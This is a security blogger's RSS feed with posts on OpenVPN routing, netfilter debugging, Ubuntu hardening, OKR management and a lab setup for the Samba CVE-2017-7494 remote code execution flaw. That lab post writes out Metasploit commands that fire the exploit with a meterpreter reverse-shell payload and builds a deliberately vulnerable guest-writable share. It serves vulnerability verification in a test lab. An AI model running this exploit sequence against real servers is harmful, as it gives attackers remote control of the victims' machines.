<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Zer0d0y(段公子)&#39;s Blog</title>
    <link>https://www.zer0d0y.info/feed/index.xml</link>
    <description>Recent content on Zer0d0y(段公子)&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-CN</language>
    <copyright>Copyright (c) 2017. All rights reserved.</copyright>
    <lastBuildDate>Sat, 31 Mar 2018 14:33:58 +0800</lastBuildDate>
    <atom:link href="https://www.zer0d0y.info/feed/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>红蓝对抗 - 蓝队手册（BTFM）</title>
      <link>https://www.zer0d0y.info/post/btfm/</link>
      <pubDate>Sat, 31 Mar 2018 14:33:58 +0800</pubDate>
      
      <guid>https://www.zer0d0y.info/post/btfm/</guid>
      <description>


&lt;figure &gt;
    
        &lt;img src=&#34;images/BTFM.jpeg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;table class=&#34;image&#34;&gt;
&lt;caption align=&#34;bottom&#34;&gt; &lt;/caption&gt;
&lt;/table&gt;

&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;

&lt;p&gt;&amp;emsp;&amp;emsp;红蓝对抗的思想最早可追溯到我国现存最早的一部兵书《孙子兵法》，孙子·谋攻篇：“知彼知己，百战不殆；”，意为如果对敌我双方的情况都能了解透彻，打多少次仗都不会失败。在信息安全领域目前大家都有一个共识：“未知攻，焉知防”，攻防对抗本身是一个持续的过程，在具体的对抗中，对对手了解越多就会占据主导地位。&lt;/p&gt;

&lt;p&gt;&amp;emsp;&amp;emsp;&lt;strong&gt;红蓝对抗的主要目的在于，提高公司安全成熟度及其检测和响应攻击的能力。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&amp;emsp;&amp;emsp;&lt;strong&gt;Red Teams attack, and Blue Teams defend, but the primary goal is shared between them: improve the security posture of the organization.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;本文已发表在嘶吼RoarTalk，未经授权，请勿转载！ &lt;a href=&#34;http://www.4hou.com/technology/10173.html&#34;&gt;http://www.4hou.com/technology/10173.html&lt;/a&gt;
最佳阅读体验版：&lt;a href=&#34;https://stackedit.io/viewer#!url=https://raw.github.com/Zer0d0y/BTFM/master/README.md&#34;&gt;https://stackedit.io/viewer#!url=https://raw.github.com/Zer0d0y/BTFM/master/README.md&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Tips and Hacks for Everyday Life</title>
      <link>https://www.zer0d0y.info/post/Tips-and-Hacks-for-Everyday-Life/</link>
      <pubDate>Thu, 03 Aug 2017 15:45:41 +0800</pubDate>
      
      <guid>https://www.zer0d0y.info/post/Tips-and-Hacks-for-Everyday-Life/</guid>
      <description>

&lt;h5 id=&#34;mark-1-netfilter-debugging-mark&#34;&gt;&lt;mark&gt;1.Netfilter Debugging&lt;/mark&gt;&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;iptables -t raw -A OUTPUT -p icmp -j TRACE
iptables -t nat -A OUTPUT -d 10.8.0.0/24 -j DNAT --to 192.168.8.1

iptables -t raw -vnL --line
iptables -t nat -vnL --line

ping -c1 10.8.0.10
    
tail -F /var/log/kern.log
&lt;/code&gt;&lt;/pre&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;images/Tips-and-Hacks-for-Everyday-Life-p1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;table class=&#34;image&#34;&gt;
&lt;caption align=&#34;bottom&#34;&gt;&lt;/caption&gt;
&lt;/table&gt;

&lt;p&gt;Reference:&lt;br /&gt;
&lt;a href=&#34;http://www.strlen.de/talks/nfdebug.pdf&#34;&gt;http://www.strlen.de/talks/nfdebug.pdf&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;http://inai.de/images/nf-packet-flow.svg&#34;&gt;http://inai.de/images/nf-packet-flow.svg&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Your packets are Your packets:Fun with OpenVPN and iptables</title>
      <link>https://www.zer0d0y.info/post/Your-packets-are-Your-packets-Fun-with-OpenVPN-and-iptables/</link>
      <pubDate>Tue, 01 Aug 2017 09:09:00 +0800</pubDate>
      
      <guid>https://www.zer0d0y.info/post/Your-packets-are-Your-packets-Fun-with-OpenVPN-and-iptables/</guid>
      <description>


&lt;figure &gt;
    
        &lt;img src=&#34;images/Your-packets-are-Your-packets-p1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;table class=&#34;image&#34;&gt;
&lt;caption align=&#34;bottom&#34;&gt; &#34;Network Diagram&#34; &lt;/caption&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code&gt;TL;DR - Connecting 2 Networks(Multiple subnet) with OpenVPN
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;1-setting-up-the-openvpn-server&#34;&gt;1.Setting up the OPENVPN SERVER&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;# Server IP：10.0.70.15
# OS：CentOS 6.x
# openvpn version：openvpn-2.4.3-1.el6.x86_64

yum check-update 
yum install -y epel-release
yum install openvpn easy-rsa screen -y

cp /usr/share/doc/openvpn-*/sample/sample-config-files/server.conf /etc/openvpn

vi /etc/openvpn/server.conf
ca ca.crt
cert server.crt
cipher AES-256-CBC
dev tun
dh dh2048.pem
explicit-exit-notify 1
group nobody
ifconfig-pool-persist ipp.txt
keepalive 10 120
key server.key  # This file should be kept secret
persist-key
persist-tun
port 1194
proto udp
push &amp;quot;dhcp-option DNS 114.114.114.114&amp;quot;
push &amp;quot;dhcp-option DNS 223.6.6.6&amp;quot;
server 10.8.0.0 255.255.255.0
status openvpn-status.log
tls-auth ta.key 0 # This file is secret
user nobody
verb 3
# The route entries adjust the local routing table, telling it to route those networks over the vpn. The push routes are added on the clients connecting, telling them to route those networks over the vpn.
push &amp;quot;route 10.0.70.0 255.255.255.0&amp;quot;
push &amp;quot;route 10.0.90.0 255.255.255.0&amp;quot;
comp-lzo

mkdir -p /etc/openvpn/easy-rsa/keys
cp -rf /usr/share/easy-rsa/2.0/* /etc/openvpn/easy-rsa

vi /etc/openvpn/easy-rsa/vars
### Add to the end of file
export KEY_COUNTRY=&amp;quot;CN&amp;quot;
export KEY_PROVINCE=&amp;quot;GD&amp;quot;
export KEY_CITY=&amp;quot;sz&amp;quot;
export KEY_ORG=&amp;quot;baidu&amp;quot;
export KEY_EMAIL=&amp;quot;admin@baidu.com&amp;quot;
export KEY_CN=baidu.com
export KEY_NAME=baidu
export KEY_OU=baidu

cp /etc/openvpn/easy-rsa/openssl-1.0.0.cnf /etc/openvpn/easy-rsa/openssl.cnf
cd /etc/openvpn/easy-rsa
source ./vars
./clean-all
./build-ca
./build-key-server server
./build-dh
cd /etc/openvpn/easy-rsa/keys
cp dh2048.pem ca.crt server.crt server.key /etc/openvpn
cd /etc/openvpn/easy-rsa
./build-key client
cd /etc/openvpn
openvpn --genkey --secret ta.key

&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;2-enable-port-forwarding-setting-up-iptables&#34;&gt;2.Enable Port Forwarding &amp;amp; setting up iptables&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;vi /etc/sysctl.conf
net.ipv4.ip_forward = 1
sysctl -p

iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -A INPUT -i tun0 -j ACCEPT 
iptables -A INPUT -s 39.xxx.xxx.xxx/32 -j ACCEPT 
iptables -A INPUT -p udp -m udp --dport 1194 -j ACCEPT 
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT 
iptables -A INPUT -p icmp -j ACCEPT 
iptables -A INPUT -i lo -j ACCEPT 
iptables -A INPUT -j REJECT --reject-with icmp-host-prohibited 
iptables -A FORWARD -i tun0 -j ACCEPT 
 
iptables -P PREROUTING ACCEPT
iptables -P POSTROUTING ACCEPT
iptables -P OUTPUT ACCEPT
iptables -A POSTROUTING -s 10.8.0.0/24 -o eth1 -j MASQUERADE

service iptables save

service openvpn start
chkconfig openvpn on
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;3-client-configuration&#34;&gt;3.Client configuration&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;yum check-update 
yum install -y epel-release
yum install openvpn easy-rsa screen -y

mkdir openvpn_client
cd openvpn_client/
vi ta.key # same as openvpn server key(ta.key)

vi client.ovpn
client
dev tun
proto udp
remote 122.xxx.xxx.xxx 1194
resolv-retry infinite
nobind
persist-key
persist-tun
comp-lzo
verb 3
tls-auth /root/openvpn_client/ta.key 1
&amp;lt;ca&amp;gt;
Contents of ca.crt
&amp;lt;/ca&amp;gt;
&amp;lt;cert&amp;gt;
Contents of client.crt
&amp;lt;/cert&amp;gt;
&amp;lt;key&amp;gt;
Contents of client.key
&amp;lt;/key&amp;gt;

### start client
screen -S openvpn
openvpn --config /root/openvpn_client/client.ovpn
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;4-target-server-configuration&#34;&gt;4.Target Server configuration&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;#（10.0.70.0/24）
ip r add 10.8.0.0/24 via 10.0.70.15

#（10.0.90.0/24）
iptables -t nat -A OUTPUT -d 10.8.0.0/24 -j DNAT --to 10.0.70.15
ON OPENVPN server:
iptables -t nat -A PREROUTING -s 10.0.90.0/24 -j DNAT --to 10.8.0.6

### 以上两种情况也可以通过交换机配置路由实现，如下
ip route-static 10.8.0.0 255.255.255.0 10.0.70.15
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;5-troubleshooting&#34;&gt;5.Troubleshooting&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;1.RTNETLINK answers: Network is unreachable
The issue is that the next hop or gateway in routes need to be on the same network as the one you are connected to.

2.RTNETLINK answers: No such process
For example, LAN is 192.168.56.100. ip route add 8.8.8.8/32 via 192.168.6.1 results in RTNETLINK answers: No such process because 192.168.6.1 is not known to the host.

3.
WARNING: cannot stat file &#39;ta.key&#39;: The system cannot find the file specified. (errno=2)
https://www.reddit.com/r/OpenVPN/comments/5wihmg/warning_cannot_stat_file_takey/
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>搭建漏洞利用测试环境</title>
      <link>https://www.zer0d0y.info/post/notes-on-bug-hunting-labs/</link>
      <pubDate>Sun, 30 Jul 2017 21:25:03 +0800</pubDate>
      
      <guid>https://www.zer0d0y.info/post/notes-on-bug-hunting-labs/</guid>
      <description>


&lt;figure &gt;
    
        &lt;img src=&#34;images/bug-hunting-labs.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;table class=&#34;image&#34;&gt;
&lt;caption align=&#34;bottom&#34;&gt; &lt;/caption&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code&gt;TL;DR - 快速搭建漏洞利用测试环境，进行漏洞验证。本文以Samba远程代码执行漏洞(CVE-2017-7494)为例
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;1-samba-cve-2017-7494-漏洞概述&#34;&gt;1.Samba CVE-2017-7494 漏洞概述&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;2-环境介绍&#34;&gt;2.环境介绍&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;攻击者操作系统：
Kali linux 2017.1(kali-rolling)

目标操作系统：
Ubuntu 16.04.2 LTS

漏洞软件包版本：
samba 2:4.3.11+dfsg-0ubuntu0.16.04.6

漏洞软件包下载地址：
https://launchpad.net/~ubuntu-security-proposed/+archive/ubuntu/ppa/+build/12371197
https://github.com/Zer0d0y/Samba-CVE-2017-7494/blob/master/Samba_CVE-2017-7494_pkgs.tar.gz
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;3-samba配置&#34;&gt;3.Samba配置&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;# Samba配置
vi /etc/samba/smb.conf
# 在文件最后添加如下内容
[public]
path = /share
public = yes
writable = yes
guest ok = yes

# 创建目录、设置权限、重启服务
mkdir /share
chown nobody:nogroup /share/
/etc/init.d/smbd restart
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;4-漏洞利用-metasploit&#34;&gt;4.漏洞利用（metasploit）&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;msfconsole
use exploit/linux/samba/is_known_pipename
set RHOST 192.168.8.95
show targets
set target 3
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.8.82
set LPORT 51000
show options
exploit
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;5-安装老版本软件包-ubuntu-和-centos-进行漏洞验证&#34;&gt;5.安装老版本软件包（Ubuntu 和 CentOS）进行漏洞验证&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;# Ubuntu
方法一.通过launchpad下载
https://launchpad.net/ubuntu/版本代号/+source/软件包名

举例：Ubuntu 16.04 xenial
https://launchpad.net/ubuntu/xenial/+source/samba
选择相关版本：
https://launchpad.net/ubuntu/+source/samba/2:4.3.11+dfsg-0ubuntu0.16.04.6
选择平台：Builds ---&amp;gt; amd64
https://launchpad.net/~ubuntu-security-proposed/+archive/ubuntu/ppa/+build/12371197
下载所需软件包：
dpkg -l | grep samba | cut -d&#39; &#39; -f3
wget xxx.deb

# CentOS
方法一.
yum --showduplicates list samba

方法二.
http://vault.centos.org/6.0/os/x86_64/Packages/
http://vault.centos.org/6.0/os/SRPMS/Packages/ or http://ftp.redhat.com/redhat/linux/enterprise/6Server/en/os/SRPMS/
http://rpm.pbone.net/
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;6-查看软件包修复了哪些bug-漏洞&#34;&gt;6.查看软件包修复了哪些Bug（#漏洞）&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;# Ubuntu
apt changelog samba

# CentOS
rpm -qa samba --changelog | head
yum install yum-plugin-changelog
yum changelog 1 samba | less
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;7-samba-cve-2017-7494-on-centos-6-5&#34;&gt;7.Samba CVE-2017-7494 on CentOS 6.5&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;# 安装老版本Samba
yum --showduplicates list samba
yum remove samba-*
yum install samba-3.6.23-41.el6
setenforce 0

# 配置Samba
vi /etc/samba/smb.conf
[global]
workgroup = WORKGROUP
server string = 23 Samba Server Version %v
netbios name = jsamba
log file = /var/log/samba/log.%m

security = share
[public]
path = /share
public = yes
writable = yes
guest ok = yes

mkdir /share
chown nobody:nobody /share -R
/etc/init.d/smb restart
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;附录-samba-cve-2017-7494-漏洞利用工具&#34;&gt;附录：Samba CVE-2017-7494 漏洞利用工具&lt;/h5&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/joxeankoret/CVE-2017-7494&#34;&gt;https://github.com/joxeankoret/CVE-2017-7494&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/sambaPipe.py&#34;&gt;https://github.com/CoreSecurity/impacket/blob/master/examples/sambaPipe.py&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;https://github.com/opsxcq/exploit-CVE-2017-7494&#34;&gt;https://github.com/opsxcq/exploit-CVE-2017-7494&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;https://github.com/omri9741/cve-2017-7494&#34;&gt;https://github.com/omri9741/cve-2017-7494&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# Notes on CoreSecurity impacket
修改文件impacket/smb3.py
# 行925 注释掉 fileName = string.replace(fileName, &#39;/&#39;, &#39;\\&#39;)
# 行927 注释掉 fileName = ntpath.normpath(fileName)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>天御实验室</title>
      <link>https://www.zer0d0y.info/post/01sec-Tlab/</link>
      <pubDate>Thu, 04 May 2017 17:23:10 +0800</pubDate>
      
      <guid>https://www.zer0d0y.info/post/01sec-Tlab/</guid>
      <description>


&lt;figure &gt;
    
        &lt;img src=&#34;images/Tlab.jpeg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;table class=&#34;image&#34;&gt;
&lt;caption align=&#34;bottom&#34;&gt; &lt;/caption&gt;
&lt;/table&gt;

&lt;h5 id=&#34;实验室方向&#34;&gt;实验室方向：&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;前沿安全攻防技术研究（主流操作系统、互联网和移动互联网应用、云计算技术及物联网设备）
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;实验室使命&#34;&gt;实验室使命：&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;***** 用未来技术服务现在 *****
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;实验室成员要求&#34;&gt;实验室成员要求：&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;1.认同并理解工程师文化，认同并理解OKR（Google），富有激情.

3.有软件工程研发经验，对（信息）安全有自己的理解.

3.精通安全攻防技术.

4.某个领域或几个领域顶级专家.
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;天御实验室&#34;&gt;天御实验室&lt;/h5&gt;

&lt;p&gt;&lt;a href=&#34;https://www.01sec.blog/&#34;&gt;https://www.01sec.blog/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Goal Science Thinking（目标科学思维）</title>
      <link>https://www.zer0d0y.info/post/Goal-Science-Thinking/</link>
      <pubDate>Wed, 26 Apr 2017 16:53:17 +0800</pubDate>
      
      <guid>https://www.zer0d0y.info/post/Goal-Science-Thinking/</guid>
      <description>


&lt;figure &gt;
    
        &lt;img src=&#34;images/OKR.jpg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;table class=&#34;image&#34;&gt;
&lt;caption align=&#34;bottom&#34;&gt; &#34;OKR&#34;&lt;/caption&gt;
&lt;/table&gt;

&lt;h5 id=&#34;常常思考-为什么okr-目标和关键成果-在google取得了巨大成功-为什么其他-硅谷新创-公司就不行呢-facebook-bat缺人才吗&#34;&gt;常常思考：“为什么OKR（目标和关键成果）在Google取得了巨大成功，为什么其他（硅谷新创）公司就不行呢？Facebook、BAT缺人才吗？”&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;每每想到这个就会想起本（Ben Horowitz），创业是一个非常复杂的过程，创始人或选择创业的每一个人需要保持持续的激情、强烈的愿景、情怀，我自己在多家创业公司工作过，我的人生经验告诉自己：“一百万人中真正适合创业的只有一人”，创业对人的身体和精神都是极大的挑战，没有极其强大的内心，身体和精神随时都会瞬间崩溃，这很像马拉松，一旦起跑，目标只能是终点，中途不能有任何放弃的想法，否则对身体和精神都会产生破坏性的伤害。我曾经在一次马拉松中，因为各种原因，中途差点放弃，这种感觉真不好。选择创业，你的选择就只有一个“奔跑起来”（此处没有“。”号）
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;我认为大多数企业无法有效推进okr-最大的原因还是在人-okr要求每一个员工都必须非常优秀-一流的人才-且认同okr&#34;&gt;我认为大多数企业无法有效推进OKR，最大的原因还是在人，OKR要求每一个员工都必须非常优秀（一流的人才）且认同OKR。&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;一流的人才具备两个基本特点：   
1.真诚（真实、诚信、真诚），真诚的人会主动学习和探索一切，乔布斯说的好：“Stay Foolish，Stay Hungry”   
2.知识，学富五车，知识面越广会极大激发创新。   
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;什么是okr-目标和关键成果&#34;&gt;什么是OKR（目标和关键成果）？&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;OKR系统简单，帮助公司整理和执行计划，并从上到下按照命令链排布。

以下两篇文章可以帮助你理解OKR的核心思想：（如果你读完之后还不明白什么是OKR，读十遍）
1.Keys to OKR Success: A Q&amp;amp;A with the Man Who Introduced OKRs to Google, John Doerr
https://blog.betterworks.com/keys-okr-success-qa-john-doerr/

2.如何更好地进行技术工程管理？谷歌是这样做的！
http://mp.weixin.qq.com/s?__biz=MzA4NTU2MTg3MQ==&amp;amp;mid=2655158142&amp;amp;idx=1&amp;amp;sn=011ba77ec3664354b585b0aa4643f1da
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;什么是目标科学思维-goal-science-thinking&#34;&gt;什么是目标科学思维（Goal Science Thinking）？&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;目标科学思维，是以OKR为基础，结合人类行为心理学，增强互动，推行习惯做法的一种方法。这套方法把我们一般人用来养成好习惯的所有技巧和手段都利用上了——只是把它们重新想象一下，用来帮助大型团队牢牢把握住业务目标。
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;向大家推荐goal-summit-2017-另外我觉得betterworks推出的一些东西已经完全脱离okr的思想&#34;&gt;向大家推荐Goal Summit 2017，另外我觉得BetterWorks推出的一些东西已经完全脱离OKR的思想。&lt;/h5&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;images/Goal-Summit-2017.jpg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;table class=&#34;image&#34;&gt;
&lt;caption align=&#34;bottom&#34;&gt; &#34;Goal Summit 2017&#34;&lt;/caption&gt;
&lt;/table&gt;

&lt;p&gt;Go：&lt;a href=&#34;https://www.goalsummit.com/&#34;&gt;https://www.goalsummit.com/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>互联网企业安全指南（二）：系统安全加固指南</title>
      <link>https://www.zer0d0y.info/post/advanced-enterprise-security-guidelines-for-internet-companies-part2/</link>
      <pubDate>Fri, 21 Apr 2017 11:23:21 +0800</pubDate>
      
      <guid>https://www.zer0d0y.info/post/advanced-enterprise-security-guidelines-for-internet-companies-part2/</guid>
      <description>


&lt;figure &gt;
    
        &lt;img src=&#34;images/AES-sec02.jpg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;table class=&#34;image&#34;&gt;
&lt;caption align=&#34;bottom&#34;&gt; &lt;/caption&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code&gt;TL;DR - 系统安全加固指南，模块独立，可移植到其他平台。
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;ubuntu-14-04-lts-server-security-hardening-系统安全加固&#34;&gt;Ubuntu 14.04 LTS Server Security hardening （系统安全加固）&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;Revision History 修正历史
	Current version: 0.1.10
	draft (as of 2017-03-08)

Platforms 适用平台
	Ubuntu 14.04 LTS Server

需求级别定义：
A.必须  # 必须执行
B.可选  # 非必须，有多种方案选择
C.需要评估 # 性能和是否可行评估
D.后期执行  # 后期完善
E.必须但需要评估  # 必须执行但是需要先评估，确保没问题再执行
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;Table of Contents 目录

	1.Patching and Software Updates 软件更新
	1.1）软件包更新	A
	1.2）自动安装安全更新	C

	2.Disk Partitioning 磁盘分区	A

	3.Software Integrity Checking 文件系统完整性检查
	3.1）debsums	A
	3.2）Audit	A
	3.3）Lynis	A
	3.4）AIDE	C
	3.5）Monit	C

	4.File Permissions and Masks 文件权限和权限masks，System jobs（Cron）	A

	5.内核安全控制&amp;amp;TCP/IP协议栈安全（Via sysctl）	A

	6.Password policy 密码策略	A

	7.Console Security 控制台安全	A

	8.Disable IPv6 禁用IPv6	E

	9.SSH Settings SSH配置	A

	10.iptables 配置	A

	11.高级主题	C/E

	12.待完善

	13.参考资料
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;1-patching-and-software-updates-软件更新&#34;&gt;1.Patching and Software Updates 软件更新&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;1.1）软件包更新
apt-get update &amp;amp;&amp;amp; apt-get -y upgrade

1.2）自动安装安全更新
apt-get install unattended-upgrades
vi /etc/apt/apt.conf.d/10periodic 
vi /etc/apt/apt.conf.d/50unattended-upgrades

ToDo：
把不能和不需要的软件加入黑名单，避免被自动更新。

参考：
https://help.ubuntu.com/14.04/serverguide/automatic-updates.html
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;2-disk-partitioning-磁盘分区&#34;&gt;2.Disk Partitioning 磁盘分区&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;1.1）/tmp 使用独立分区
解释：临时文件、全局可写

1.2）/var/log 使用独立分区
解释：日志文件，备份、取证等
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;3-software-integrity-checking-文件系统完整性检查&#34;&gt;3.Software Integrity Checking 文件系统完整性检查&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;3.1）debsums 已安装软件包完整性检查
apt-get install debsums
使用示例：debsums openssh-client
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;3.2）Audit 安全审计
详见配置文件：
Cyqz_OS_Security_Checklist_auditd.md
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;3.3）Lynis Security auditing/Vulnerability detection and scanning/System hardening
3.3.1）安装
apt-key adv --keyserver keyserver.ubuntu.com --recv-keys C80E383C3DE9F082E01391A0366C67DE91CA5D5F
echo &amp;quot;deb https://packages.cisofy.com/community/lynis/deb/ trusty main&amp;quot; &amp;gt; /etc/apt/sources.list.d/cisofy-lynis.list
apt-get update &amp;amp;&amp;amp; apt-get install lynis
3.3.2）使用
lynis --checkall audit system
lynis --pentest audit system
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;3.4）AIDE - 文件、目录完整性检查
https://help.ubuntu.com/community/FileIntegrityAIDE
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;3.5）Monit 关键文件监控
详见配置文件：
Cyqz_OS_Security_Checklist_monit.md
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;参考：
lynis
https://cisofy.com/lynis/
monit
https://mmonit.com/monit/
入侵检测Checklist
https://www.sans.org/media/score/checklists/ID-Linux.pdf
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;4-file-permissions-and-masks-文件权限和权限masks-system-jobs-cron&#34;&gt;4.File Permissions and Masks 文件权限和权限masks，System jobs（Cron）&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;详见配置文件：
Cyqz_OS_Security_Checklist_files_Permissions.md

权限检查命令：
查找全局可写目录
find /dir -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print
文件权限检查
http://people.redhat.com/sgrubb/files/stig-2011/stig-file-test.sh
查找隐藏可执行文件
http://people.redhat.com/sgrubb/security/find-hidden-exec
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;5-内核安全控制-tcp-ip协议栈安全-via-sysctl&#34;&gt;5.内核安全控制&amp;amp;TCP/IP协议栈安全（Via sysctl）&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;详见配置文件：
Cyqz_OS_Security_Checklist_sysctl.md

需要考虑LVS相关设置，
https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/7/html/Load_Balancer_Administration/s1-lvs-direct-VSA.html
http://kb.linuxvirtualserver.org/wiki/Using_arp_announce/arp_ignore_to_disable_ARP

参考：
https://klaver.it/linux/sysctl.conf
http://pastebin.com/YRz1qiKE
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;6-password-policy-密码策略&#34;&gt;6.Password policy 密码策略&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;6.1）安装PAM模块pam_cracklib
apt-get install libpam-cracklib
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;6.2）配置（修改对应行为以下内容）
vi /etc/pam.d/common-password
# Prevent Reusing Old Passwords
password	[success=1 default=ignore]	pam_unix.so obscure use_authtok try_first_pass sha512 remember=5
# Set Password Complexity
password     requisite     pam_cracklib.so retry=3 minlen=24 dcredit=-2 ucredit=-2 ocredit=-2 lcredit=-2

# Set Password Expiration Period
vi /etc/login.defs
PASS_MAX_DAYS   90
PASS_MIN_DAYS   0
PASS_WARN_AGE   10
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;参考：
http://xmodulo.com/set-password-policy-linux.html
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;7-console-security-控制台安全&#34;&gt;7.Console Security 控制台安全&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;Disable Ctrl+Alt+Delete # 禁用Ctrl+Alt+Delete
vi /etc/init/control-alt-delete.conf
#exec shutdown -r now &amp;quot;Control-Alt-Delete pressed&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;8-disable-ipv6-禁用ipv6&#34;&gt;8.Disable IPv6 禁用IPv6&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;vi /etc/sysctl.conf
# IPv6 disabled
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
net.ipv6.conf.lo.disable_ipv6 = 1
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;9-ssh-settings-ssh配置&#34;&gt;9.SSH Settings SSH配置&lt;/h5&gt;

&lt;pre&gt;&lt;code&gt;# vi /etc/ssh/sshd_config

# What ports, IPs and protocols we listen for
Port 10022

Protocol 2
# HostKeys for protocol version 2
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_dsa_key
